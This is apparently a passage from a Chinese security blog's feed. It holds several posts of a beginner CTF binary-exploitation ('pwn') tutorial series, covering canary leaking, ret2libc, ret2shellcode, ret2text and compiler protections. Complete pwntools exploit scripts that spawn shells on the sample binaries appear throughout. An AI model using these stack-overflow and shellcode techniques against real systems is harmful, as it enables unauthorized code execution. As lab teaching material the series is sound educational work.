+<p>查看栈空间</p>
+<p>此时我们已经成功泄露canary的值</p>
+<p>那么接下来就是要考虑怎么写exp了</p>
+<h4 id="5编写exp">5）编写exp</h4>
+<p>程序给我们两次输入，我们利用第一次输入来泄露canary的值，利用第二次输入来进行栈溢出，程序中还内置了getshell函数，我们需要将返回地址覆盖成getshell函数的地址。</p>
+<p>那么现在的问题是如何利用第二次输入来进行栈溢出</p>
+<p>我们还是利用gdb来进行调试，在print()函数位置下断点，第一次输入随便输入点什么，然后ni一直下一步，直到第二次输入时，我们输入一些有规律的字符，如：ABCD234</p>
+<p>当程序运行到这里时，是第二次输入的位置，我们ni单步走一下，就可以输入字符串了，输入abcd1234后，查看栈空间</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730953797096.png" alt="" loading="lazy"></figure>
+<p>我们看图，第一个红框是我们输入的字符串位置，第二个红框是canary的值，第三个红框是返回地址，那么现在思路就比较直观了</p>
+<p>我们从输入字符串位置到canary一共是25*4个字节，canary和返回地址中间还有3*4个字节</p>
+<p>也就是说我们的payload可以写成</p>
+<pre><code class="language-javascript">payload = 'a' * 25 * 4
+payload += p32(canary)
+payload += 'a' * 3 * 4
+payload += p32(getshell_addr)
+</code></pre>
+<h4 id="6附上完整exp">6）附上完整exp</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ex2')
+
+get_canary = '%31$08x'
+r.sendline(get_canary)
+
+r.recvline()
+canary_tmp = r.recvline()
+canary = int('0x' + canary_tmp,16)
+
+payload = 'a' * 4 * 25
+payload += p32(canary)
+payload += 'a' * 4 * 3
+payload += p32(0x0804859b)
+
+sleep(1)
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(7)——栈溢出之ret2libc]]></title>
+        <id>https://ssyxsec.com/QYOP7Ti8Or/</id>
+        <link href="https://ssyxsec.com/QYOP7Ti8Or/">
+        </link>
+        <updated>2024-11-07T04:22:53.000Z</updated>
+        <content type="html"><![CDATA[<p>之前我们介绍了ret2text和ret2shellcode，这篇给大家介绍一下ret2libc。</p>
+<p>ret2libc这种攻击方式主要是针对动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。</p>
+<h3 id="0x00-动态链接">0x00 动态链接</h3>
+<h4 id="什么是动态链接">什么是动态链接</h4>
+<p><strong>动态链接是</strong>指在程序装载时通过<strong>动态链接器</strong>将程序所需的所有<strong>动态链接(Dynamic linking library)</strong> 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。</p>
+<p>它诞生的最主要的的原因就是<strong>静态链接</strong>太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在<strong>静态链接</strong>的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过<strong>动态链接</strong>的方式就推迟这个链接过程到了程序运行时进行。</p>
+<h4 id="动态链接的好处">动态链接的好处</h4>
+<h5 id="节省内存-磁盘空间">节省内存、磁盘空间</h5>
+<p>例如磁盘中有两个程序，p1、p2，且他们两个都包含lib.o这个模块，在<strong>静态链接</strong>的情况下他们在链接输出可执行文件时都会包含lib.o这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似lib.o这种被多个程序共享的模块时，也就会造成很大空间的浪费。在<strong>动态链接</strong>的情况下，运行p1，当系统发现需要用到lib.o，就会接着加载lib.o。这时我们运行p2，就不需要重新加载lib.o了，因为此时lib.o已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个lib.o节省了内存空间。</p>
+<h5 id="程序更新更简单">程序更新更简单</h5>
+<p>第三方更新lib.o后，理论上只需要覆盖掉原有的lib.o，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</p>
+<h5 id="增强程序扩展性和兼容性">增强程序扩展性和兼容性</h5>
+<p><strong>动态链接</strong>的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的<strong>动态链接文件</strong>，以此来实现程序功能的扩展。增强兼容性是表现在<strong>动态链接</strong>的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是<strong>静态链接</strong>的程序会为不同平台发布不同的版本，而在<strong>动态链接</strong>的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。</p>
+<p>总而言之，<strong>动态链接</strong>的程序在运行时会根据自己所依赖的<strong>动态链接库</strong>，通过<strong>动态链接器</strong>将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux系统中，ELF动态链接文件被称为<strong>动态共享对象（Dynamic Shared Objects）</strong>，简称<strong>共享对象</strong>一般都是以 “.so” 为扩展名的文件，在pwn中我们常称之为<strong>libc库</strong>；在windows系统中就是常常软件报错缺少xxx.dll文件。</p>
+<h3 id="0x01-got表plt表">0x01 GOT表&amp;PLT表</h3>
+<p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
+<h4 id="延迟绑定">延迟绑定</h4>
+<p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p>
+<h4 id="延迟绑定的基本原理">延迟绑定的基本原理</h4>
+<p>假如存在一个puts函数，这个函数在PLT中的条目为puts@plt，在GOT中的条目为puts@got，那么在第一次调用puts函数的时候，首先会跳转到PLT表，伪代码如下：</p>
+<pre><code class="language-javascript">puts@plt:
+    jmp puts@got
+    patch puts@got
+</code></pre>
+<p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch puts@got，这一行代码的作用是将puts函数真正的地址填充到puts@got，然后跳转到puts函数真正的地址执行代码。当我们下次再调用puts函数的时候，执行路径就是先后跳转到puts@plt、puts@got、puts真正的地址。</p>
+<p>也就是说，PLT表和GOT表是一一对应的，GOT表中存的是函数的实际地址，而PLT表中存的是函数GOT表的地址。</p>
+<p>​</p>
+<h3 id="0x02-ret2libc">0x02 ret2libc</h3>
+<p>一般来说，在我们做题的时候，会给两个文件，一个是elf程序文件，另一个则是libc库文件。不过有的题目也不会给出libc库，需要我们根据函数在libc库中的偏移量来查找对应的libc库。</p>
+<h4 id="计算libc基址">计算libc基址</h4>
+<p>libc基地址 = 函数实际地址 – 函数在libc库中的偏移地址</p>
+<p>system_addr = libc基地址 + system在libc库中的偏移地址</p>
+<h4 id="利用ret2libc需解决的问题">利用ret2libc需解决的问题</h4>
+<ul>
+<li>程序中有可输出地址内容的函数，如：puts()；</li>
+<li>计算libc基址；</li>
+<li>找到 system() 函数的地址；</li>
+<li>找到 “/bin/sh” 这个字符串的地址。</li>
+</ul>
+<h3 id="0x03-例题">0x03 例题</h3>
+<h4 id="1-查看文件信息">1) 查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file diqiandao
+$ checksec diqiandao
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730953421157.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启了NX保护。</p>
+<h4 id="2-查看程序流程">2) 查看程序流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730953428401.png" alt="" loading="lazy"></figure>
+<p>程序获取一次用户输入</p>
+<h4 id="3-分析程序查找漏洞点">3) 分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<pre><code class="language-javascript">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-64h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);
+  printf(&quot;Can you find it !?&quot;);
+  gets(&amp;s);
+  return 0;
+}
+</code></pre>
+<p>我们看到main()函数中，有puts()函数和gets()函数，这里gets()函数是存在溢出的，我们可以利用这个溢出，构造一个puts()函数，将函数实际地址打印出来。</p>
+<p>但是这里存在一个问题，我们这个程序只提供一次用户输入，而我们至少需要两次输入（一次用来获取函数实际地址，一次用来发送payload）。所以，我们构造puts()函数时需要加上返回地址，返回到main()函数，让我们可以再次输入。</p>
+<h4 id="4-构造payload">4) 构造payload</h4>
+<p>首先，和之前一样，简单的栈溢出，只不过返回到puts()函数上，顺便加上puts()函数的参数。</p>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./diqiandao')
+elf = ELF('./diqiandao')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+main_addr = 0x08048618
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+
+padding = 112
+
+payload = 'a' * padding
+payload += p32(puts_plt)
+payload += p32(main_addr)
+payload += p32(puts_got)
+
+r.sendlineafter('?',payload)
+
+r.interactive()
+</code></pre>
+<p>**注：**这里需要注意一下，在本地调试的时候，程序调用的libc库是当前虚拟机的libc库，因此，写payload的时候，需要导入虚拟机的libc库，而不是题目给出的libc库。在本地调试成功后，将libc库换成题目给的，然后执行脚本即可。</p>
+<p>这里可使用ldd命令来查看当前程序所使用的libc库地址。</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730953449059.png" alt="" loading="lazy"></figure>
+<p>计算偏移量和覆盖返回地址不再演示，和之前一样，这里主要讲解一下payload的构造。</p>
+<p>32位ELF程序通过栈来传递参数，而64位ELF程序则是通过rdi寄存器来传递参数。</p>
+<p>这道题是32位ELF程序，因此，我们需要构造一个栈结构。之前我们讲过栈帧的结构，我们只需要按照栈帧结构来构造即可。先构造main()函数，造成溢出，然后构造puts()函数。</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730953457628.png" alt="" loading="lazy"></figure>
+<p>只需要按照1，2，3，4的顺序来写payload。</p>
+<p>先来运行一下脚本。</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730953467621.png" alt="" loading="lazy"></figure>
+<p>可以看到，已经给我们打印了一个二进制格式的数据，这就是puts()函数给我们返回的puts@got的值，也就是puts函数的实际地址。我们只需要将其u32解包就可以得到一个16进制地址。</p>
+<p>程序执行完puts()函数之后也成功返回到main()函数，我们可以再次利用main()函数的栈溢出漏洞来进行第二段payload的发送。</p>
+<p>接下来我们继续构造我们的payload。</p>
+<p>首先将地址解包，这里我们需要用到pwntools的recv()。</p>
+<pre><code class="language-javascript">puts_real_addr = u32(r.recv(4))
+print hex(puts_real_addr)
+</code></pre>
+<p>因为32位程序的地址是4个字节，因此我们这里r.recv(4)表示接收4个字节的数据，并通过u32()来解包。</p>
+<p>​</p>
+<p>我们已经成功将puts函数的实际地址打印出来。</p>
+<p>那么接下来就简单许多，我们需要计算libc的基地址，并利用libc基地址来计算system()函数和/bin/sh字符串的地址。然后利用mian()函数的栈溢出漏洞，溢出到我们构造好的system()函数上即可。</p>
+<p>先计算libc基地址，并打印一下看看。</p>
+<pre><code class="language-javascript">libc_base = puts_real_addr - libc.symbols['puts']
+print hex(libc_base)
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730953478253.png" alt="" loading="lazy"></figure>
+<p>我们看到，打印出来的libc基地址后三位是0，证明我们没有计算错误，若后三位不是0，说明计算的有问题。</p>
+<p>接下来计算system()和/bin/sh的地址。</p>
+<pre><code class="language-javascript">system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+</code></pre>
+<p>这两个地址大家记住就好，所有题都可以这么写。</p>
+<p>接下来构造system()函数，和puts()函数一样，system()函数也只有一个参数，因为这里不需要再次返回到main()函数，所以返回地址我们可以随便写。</p>
+<pre><code class="language-javascript">payload_2 = 'a' * padding
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+</code></pre>
+<p>我们运行一下脚本</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730953514030.png" alt="" loading="lazy"></figure>
+<p>我们看到程序异常退出了，并没有给我们返回shell，这里我们用gdb动态调试一下。</p>
+<p>在脚本前加上这两句，并在运行脚本时加上G，即可开启动态调试。</p>
+<pre><code class="language-javascript">context.terminal = ['tmux', 'splitw', '-h']
+if args.G:
+        gdb.attach(proc.pidof(r)[0])
+</code></pre>
+<pre><code class="language-javascript">$ python exp.py G
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730953520995.png" alt="" loading="lazy"></figure>
+<p>pwntools会自动在新的终端窗口中帮我们开启GDB动态调试。</p>
+<p>**注：**这里大家要是不能开启新窗口，请下载安装tmux，或者根据你当前的终端来修改context.terminal的参数。</p>
+<p>我们在GDB窗口中输入c，让脚本继续运行。</p>
+<p>​</p>
+<p>我们看到程序在一个奇怪的地址被中断了。我们查看寄存器窗口，EIP指向0x61616161，也就是’aaaa’，我们再看堆栈窗口</p>
+<pre><code class="language-javascript">00:0000│ esp  0xffb87b38 ◂— 0x61616161 ('aaaa')
+01:0004│      0xffb87b3c —▸ 0xf75ebda0 (system) ◂— sub    esp, 0xc
+02:0008│      0xffb87b40 ◂— 0xdeadbeef
+03:000c│      0xffb87b44 —▸ 0xf770ca0b ◂— das     /* '/bin/sh' */
+04:0010│      0xffb87b48 —▸ 0xf7763000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+05:0014│      0xffb87b4c —▸ 0xf77abc04 ◂— 0x0
+06:0018│      0xffb87b50 —▸ 0xf77ab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40
+07:001c│      0xffb87b54 ◂— 0x0
+</code></pre>
+<p>esp寄存器当前指向也是0x61616161，也是’aaaa’，再往下就是我们构造的payload_2，也就是说，我们第二次调用main()函数时，他的偏移量不是之前的112了，而是112-8，我们修改一下payload_2</p>
+<pre><code class="language-javascript">payload_2 = 'a' * (padding - 8)
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+</code></pre>
+<p>执行脚本</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730953531181.png" alt="" loading="lazy"></figure>
+<p>成功拿到shell。</p>
+<h3 id="0x04-完整exp">0x04 完整exp</h3>
+<pre><code class="language-javascript">from pwn import *
+
+context.terminal = ['tmux', 'splitw', '-h']
+r = process('./diqiandao')
+elf = ELF('./diqiandao')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+if args.G:
+        gdb.attach(proc.pidof(r)[0])
+
+main_addr = 0x08048618
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+#puts_addr = elf.symbols['puts']
+
+padding = 112
+
+payload = 'a' * padding
+payload += p32(puts_plt)
+payload += p32(main_addr)
+payload += p32(puts_got)
+
+r.sendlineafter('?',payload)
+
+puts_real_addr = u32(r.recv(4))
+#print hex(puts_real_addr)
+
+libc_base = puts_real_addr - libc.symbols['puts']
+print hex(libc_base)
+
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + libc.search('/bin/sh').next()
+
+payload_2 = 'a' * (padding - 8)
+payload_2 += p32(system_addr)
+payload_2 += p32(0xdeedbeef)
+payload_2 += p32(bin_sh_addr)
+
+sleep(1)
+r.sendline(payload_2)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(6)——栈溢出之ret2shellcode]]></title>
+        <id>https://ssyxsec.com/Yhk9EnYl-3/</id>
+        <link href="https://ssyxsec.com/Yhk9EnYl-3/">
+        </link>
+        <updated>2024-11-07T04:18:22.000Z</updated>
+        <content type="html"><![CDATA[<p>上篇我们介绍了ret2text，但是这种利用方式有很大的限制。使用ret2text的前提是，程序中有写好的可返回shell的function。否则，就没办法利用了。</p>
+<p>这篇给大家介绍一个新的利用方法——ret2shellcode，程序中没有shell，那么我们就写一个进去。</p>
+<h3 id="0x00-ret2shellcode">0x00 ret2shellcode</h3>
+<p>ret2shellcode 又称 Return to shellcode 或ret2sc，当程序的data段是可写可执行且位置固定时，我们可将shellcode写到data段上，并通过栈溢出覆盖返回地址到shellcode。</p>
+<h3 id="0x01-例题">0x01 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file ret2sc
+$ checksec ret2sc
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730953203279.png" alt="" loading="lazy"></figure>
+<p>这是一个32位程序，所有保护都没开</p>
+<h4 id="2查看程序大概流程">2）查看程序大概流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730953213035.png" alt="" loading="lazy"></figure>
+<p>程序获取两次用户输入</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<pre><code class="language-javascript">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-14h]
+
+  setvbuf(stdout, 0, 2, 0);
+  printf(&quot;Name:&quot;);
+  read(0, &amp;name, 0x32u);
+  printf(&quot;Try your best:&quot;);
+  return gets(&amp;s);
+}
+</code></pre>
+<p>我们看到，程序的两次输入分别是用read()和gets()函数实现的，我们双击进入&amp;name变量中</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730953223043.png" alt="" loading="lazy"></figure>
+<p>发现name变量存在在bss段中，且长度足够，不存在溢出</p>
+<p>我们再进入&amp;s变量看一下</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730953230097.png" alt="" loading="lazy"></figure>
+<p>s变量的大小为0x18，但是gets()函数不会限制我们输入，所以这里是存在栈溢出的</p>
+<p>我们继续查看其它函数，并没有发现可给我们返回shell的函数，这里我们就要自己构造shellcode</p>
+<p>那么我们在什么位置写入shellcode呢？</p>
+<p>将程序导入gdb并运行，ctrl+c将程序中断，利用vmmap查看地址段权限</p>
+<pre><code class="language-javascript">$ gdb ret2sc
+gdb-peda$ r
+# ctrl + c
+gdb-peda$ vmmap
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730953237309.png" alt="" loading="lazy"></figure>
+<p>我们看到bss段是可写可执行的，那么我们就可以将shellcode写入name变量</p>
+<h4 id="4计算溢出偏移">4）计算溢出偏移</h4>
+<p>和之前一样，将程序导入gdb，使用pattern工具计算偏移</p>
+<p>不过这道题目name变量是不存在溢出的，所以我们要在第二次输入的时候输入pattern生成的字符串</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730953255823.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730953261973.png" alt="" loading="lazy"></figure>
+<p>计算出溢出偏移为32，接下来我们就可以构造payload了</p>
+<h4 id="5构造payload">5）构造payload</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2sc')
+elf = ELF('./ret2sc')
+
+padding = 32
+name_addr = 0x0804A060
+
+shellcode = asm(shellcraft.sh())
+r.sendlineafter('Name:',shellcode)
+
+payload = 'a' * padding
+payload += p32(name_addr)
+r.sendlineafter('best:',payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(5)——栈溢出之ret2text]]></title>
+        <id>https://ssyxsec.com/LW78J1YCzS/</id>
+        <link href="https://ssyxsec.com/LW78J1YCzS/">
+        </link>
+        <updated>2024-11-06T09:59:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-栈溢出">0x00 栈溢出</h3>
+<h4 id="buffer-overflow缓冲区溢出">Buffer Overflow（缓冲区溢出）</h4>
+<p>因为程序本身没有正确检查输入数据的大小，造成攻击者可以输入比buffer还要大的数据，使得超出部分覆盖程序的其他部分，影响程序执行。</p>
+<pre><code class="language-javascript"># include &lt;stdio.h&gt;
+
+chr name[50];    //设置name变量，大小为50个字节
+
+int main(){
+    setvbuf(stdout,0,2,0);
+    printf(&quot;Name:&quot;);
+    read(0,name,50);      //读取50个字节到name
+    char buf[20];         //设置buf变量，大小为20个字节
+    printf(&quot;Try your best:&quot;);
+    gets(buf);            //读取用户输入到buf（不限长度）
+    return;
+}
+</code></pre>
+<p>从上面代码我们可以看出，read()函数限定了接收数据的字节数，并没有造成溢出，但是gets()函数没有限制接收数据的大小，若用户输入大于20个字节的数据，就会造成溢出。</p>
+<h4 id="stack-overflow栈溢出">Stack Overflow（栈溢出）</h4>
+<p>又称stack smashing，专指在stack上的Overflow，利用方式简单，可直接覆盖return address和控制参数，不管是什么漏洞，如果能找到stack overflow，之后就是标准动作了。</p>
+<h4 id="常见易溢出函数">常见易溢出函数</h4>
+<p>gets；scanf；strcpy；sprintf；memcpy；strcat……</p>
+<h3 id="0x01-ret2text">0x01 ret2text</h3>
+<p>Return to text，控制程序的返回地址到原本程序中的函数（代码）。</p>
+<p>例如程序中有类似function：</p>
+<ul>
+<li>system(‘/bin/sh’)</li>
+<li>execve(‘/bin/sh’,NULL,NULL)</li>
+</ul>
+<p>就可以跳转到这个function，function的地址可以通过objdump或者ida来查找。</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>先将题目拷贝到之前搭建好的pwn环境中，然后使用file和checksec命令查看题目信息。</p>
+<pre><code class="language-javascript">$ file ./ret2text
+$ checksec ./ret2text
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730943571594.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730943577502.png" alt="" loading="lazy"></figure>
+<h4 id="2查看程序大概流程">2）查看程序大概流程</h4>
+<p>运行一下程序，了解程序的大概流程</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730943586478.png" alt="" loading="lazy"></figure>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro中分析</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730943593343.png" alt="" loading="lazy"></figure>
+<p>看到左侧函数窗口中有vuln()函数，双击进入</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730943600195.png" alt="" loading="lazy"></figure>
+<p>双击&amp;buf，查看buf大小</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730943606079.png" alt="" loading="lazy"></figure>
+<p>我们看到buf的大小为1C+4，换算成10进制为32</p>
+<p>但是read()函数可以读入的大小为50，那么这里很明显存在栈溢出</p>
+<p>我们继续看左侧函数窗口，发现shell()函数，双击进入</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730943611620.png" alt="" loading="lazy"></figure>
+<p>shell()函数中我们发现了 system(“/bin/sh”)</p>
+<p>也就是说我们调用shell()函数会给我们返回一个shell</p>
+<h4 id="4计算溢出偏移量">4）计算溢出偏移量</h4>
+<p>将程序导入gdb</p>
+<pre><code class="language-javascript">$ gdb ./ret2text
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730943618788.png" alt="" loading="lazy"></figure>
+<p>输入r或者run，将程序运行起来</p>
+<p>当提示我们输入的时候，按ctrl+c将程序中断</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730943625063.png" alt="" loading="lazy"></figure>
+<p>我们会看到这样一个界面，在终端输入</p>
+<pre><code class="language-javascript">gdb-peda$ pattern create 100
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://ssyxsec.com/post-images/1730943632902.png" alt="" loading="lazy"></figure>
+<p>工具会自动帮我们生成一个100长度的字符串</p>
+<p>我们将字符串复制，并输入c敲回车，继续运行程序</p>
+<figure data-type="image" tabindex="11"><img src="https://ssyxsec.com/post-images/1730943638764.png" alt="" loading="lazy"></figure>
+<p>将复制的字符串粘贴，并回车</p>
+<figure data-type="image" tabindex="12"><img src="https://ssyxsec.com/post-images/1730943647208.png" alt="" loading="lazy"></figure>
+<p>我们看到程序又被中断了，并且在DISASM窗口中提示Invalid address 0x41412941，程序的返回地址被我们的字符串覆盖了。</p>
+<p>第三篇我们讲过，EIP寄存器为指令寄存器，指向处理器下条等待执行的指令地址，正常情况当程序运行完当前函数EIP应该指向返回地址，并跳转到返回地址继续执行，我们看EIP寄存器的值为0x41412941，对应字符为“A)AA”，正是我们输入字符串中的字符。</p>
+<p>也就是说，我们找到“A)AA”在字符串中的位置，输入前面那些字符，并将“A)AA”替换成一个函数地址，那么当程序执行完当前函数，就会跳转到我们输入的函数地址继续执行。</p>
+<p>联想到我们之前找到的shell函数，我们将返回地址替换成shell函数的地址，那么程序执行完当前函数就会给我们返回一个shell。</p>
+<p>我们可以通过pattern工具直接算出“A)AA”在字符串中的位置</p>
+<pre><code class="language-javascript">gdb-peda$ pattern offset 0x41412941
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://ssyxsec.com/post-images/1730943654156.png" alt="" loading="lazy"></figure>
+<p>我们计算出偏移量为32。</p>
+<p>接下来我们就可以构造我们的payload了。</p>
+<h4 id="5构造payload">5）构造payload</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2text')
+
+padding = 32
+shell_addr = 0x0804851d
+
+payload = 'a' * padding
+payload += p32(shell_addr)
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PWN从入门到放弃(4)——程序保护机制]]></title>
+        <id>https://ssyxsec.com/jn9c-yxNeb/</id>
+        <link href="https://ssyxsec.com/jn9c-yxNeb/">
+        </link>
+        <updated>2024-11-06T09:57:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x00-程序保护机制">0x00 程序保护机制</h3>
+<h4 id="查看程序保护机制">查看程序保护机制</h4>
+<pre><code class="language-javascript">$ checksec ./pwn #pwn为elf程序文件
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730887111062.png" alt="" loading="lazy"></figure>
+<h3 id="0x01-cannary栈保护">0x01 <strong>CANNARY(栈保护)</strong></h3>
+<p>这个选项表示栈保护功能有没有开启。</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
+<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
+<pre><code class="language-javascript">$ gcc -fno-stack-protector -o test test.c  #禁用栈保护
+$ gcc -fstack-protector -o test test.c  #启用堆栈保护，不过只为局部变量中含有char数组的函数插入保护代码
+$ gcc -fstack-protector-all -o test test.c #启用堆栈保护，为所有函数插入保护代码
+</code></pre>
+<h3 id="0x02-nxdep">0x02 <strong>NX（DEP）</strong></h3>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p>工作原理如图：</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730887119960.png" alt="" loading="lazy"></figure>
+<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p>
+<p>例如：</p>
+<pre><code class="language-javascript">$ gcc -z execstack -o test test.c
+</code></pre>
+<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
+<h3 id="0x03-pieaslr">0x03 <strong>PIE（ASLR）</strong></h3>
+<p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况：</p>
+<ul>
+<li>0 – 表示关闭进程地址空间随机化</li>
+<li>1 – 表示将mmap的基址，stack和vdso页面随机化</li>
+<li>2 – 表示在1的基础上增加堆（heap）的随机化</li>
+</ul>
+<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
+<p>Built as PIE：位置独立的可执行区域(position-independent executables)。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
+<p>liunx下关闭PIE的命令如下：</p>
